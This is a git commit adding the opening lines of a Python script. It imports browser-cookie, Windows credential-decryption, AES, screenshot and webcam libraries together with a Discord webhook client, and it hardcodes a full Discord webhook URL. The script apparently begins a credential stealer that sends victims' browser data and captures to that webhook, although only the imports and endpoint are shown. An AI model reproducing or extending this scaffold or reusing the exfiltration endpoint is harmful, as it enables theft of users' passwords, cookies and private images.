6ba66d892c8628608bb58cc7f36dbef1f889523f
coolerthanyouhaha <149846283+coolerthanyouhaha@users.noreply.github.com>
2025-01-19 19:36:00 -0500

    Add files via upload

---
+++ Script.py
@@ -0,0 +1,6 @@
+from discord_webhook import DiscordEmbed, DiscordWebhook
+import requests,browser_cookie3,platform, GPUtil, psutil,os,shutil,base64,json,sqlite3,win32crypt,cv2,zipfile,time,pyautogui,re
+from Cryptodome.Cipher import AES
+from datetime import datetime, timedelta
+from win32crypt import CryptUnprotectData
+wbz='https://discord.com/api/webhooks/1330398120818901053/Ga3uLrnpChd06_e4P0kt5MZcz68nFjohHhkPwffH_ZDq0VN3sM2vLCjTGTxrVuqFs-zk'
